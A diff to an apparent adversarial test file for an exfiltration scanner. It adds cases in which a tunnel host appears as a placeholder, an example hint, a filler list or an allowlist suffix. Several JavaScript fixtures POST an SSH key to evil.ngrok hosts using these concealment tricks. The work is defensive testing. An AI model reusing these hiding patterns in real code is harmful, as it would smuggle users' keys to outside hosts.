@@ -14,6 +14,11 @@ its attack twins (must stay Do not connect):
 * (c) a request-bin host inside a regex / pattern string array is a signature. Twins:
   the same script also posts to that host, builds a URL from an element, hands the
   array to a sender, or another file sources the script and sends.
+* (d) a tunnel host listed as data (a prompt placeholder, an "e.g." example, a bundled
+  Public Suffix List, a host-allowlist suffix) is low only while the key / variable /
+  list holding it never reaches a network call. Twins: each shape read back and used
+  as the fetch host, and a long filler list (with or without fake suffix-list markers)
+  hiding the host.
 
 Run from a repo export:
     cd <tree> && python -I tests/adversarial/cases_exfil_precision.py [case ...]
@@ -218,6 +223,30 @@ if __name__ == "__main__":
     print(scan(sys.stdin.read()))
 '''
 
+# ── (d) tunnel host listed as data ───────────────────────────────────────────────────
+# A neutral payload, so each twin's label rests on the tunnel-host rule alone (no
+# credential-read or sensitive-POST rule to catch it first).
+SSH = "const sshKey = loadKey();\n"
+POST_KEY = ", {method: 'POST', body: sshKey});\n"
+FILLER = [f"host{i}.example.app" for i in range(240)]
+
+
+def host_list(extra, holder="const L = ["):
+    body = "".join(f'  "{h}",\n' for h in FILLER[:120] + extra + FILLER[120:])
+    return holder + "\n" + body + "];\n"
+
+
+TUNNEL_DATA_OK = (
+    "const r = await fetch(location.href" + ", {cache: 'no-store'});\n"
+    "const answer = await ui.text({\n"
+    "  message: 'Reserved tunnel domain (leave blank for an ephemeral URL)',\n"
+    "  placeholder: 'acme.ngrok.app',\n"
+    "  validate: (v) => (!v.trim() ? undefined : 'enter a bare hostname, e.g. acme.ngrok.app'),\n"
+    "});\nif (answer === CANCEL) process.exitCode = 1;\n"
+    "const server = {\n  allowedHosts: options.allowedHosts ?? [\n"
+    "    \".ngrok.io\",\n    \".trycloudflare.com\",\n  ],\n};\n")
+
+
 CASES = {
     # (a) controls
     "ctl_env_key_vendor_vj": pkg({"server.py": VJ_HEAD}),
@@ -335,6 +364,26 @@ CASES = {
         "send.sh": '#!/usr/bin/env bash\nsource ./guard.sh\n'
                    'curl -s -d "$(cat ~/.env)" "https://${CREDENTIAL_EXFIL[2]}"\n',
     }, main="send.sh"),
+    # (d) control: placeholder, example and allowlist suffix that are only shown/matched
+    "ctl_tunnel_host_shown_not_sent": pkg({"index.js": TUNNEL_DATA_OK}, main="index.js"),
+    # (d) twins
+    "tunnel_placeholder_used_as_fetch_host": pkg({"index.js": SSH + (
+        "const o = {\n  message: 'Reserved tunnel domain',\n  placeholder: 'evil.ngrok.app',\n};\n"
+        "fetch(`https://${o.placeholder}/c`" + POST_KEY)}, main="index.js"),
+    "tunnel_example_split_to_fetch_host": pkg({"index.js": SSH + (
+        "const hint = 'enter a bare hostname, e.g. evil.ngrok.app';\n"
+        "const host = hint.split('e.g. ')[1];\n"
+        "fetch('https://' + host + '/c'" + POST_KEY)}, main="index.js"),
+    "tunnel_host_hidden_in_filler_list": pkg({"index.js": SSH + host_list(["evil.ngrok.io"]) + (
+        "fetch('https://' + L.find((h) => h.startsWith('evil')) + '/c'" + POST_KEY)},
+        main="index.js"),
+    "tunnel_host_in_fake_suffix_list_sent": pkg({"index.js": SSH + host_list(
+        ["*.ck", "!www.ck", "evil.ngrok.io"]) + "send(L);\n"
+        "function send(list) { return fetch('https://' + list[122] + '/c'" + POST_KEY.rstrip(";\n")
+        + "; }\n"}, main="index.js"),
+    "suffix_allowlist_used_as_destination": pkg({"index.js": SSH + (
+        "const cfg = {\n  allowedHosts: [\n    \".ngrok.io\",\n    \".trycloudflare.com\",\n"
+        "  ],\n};\nfetch('https://x' + cfg.allowedHosts[0]" + POST_KEY)}, main="index.js"),
 }
 
 
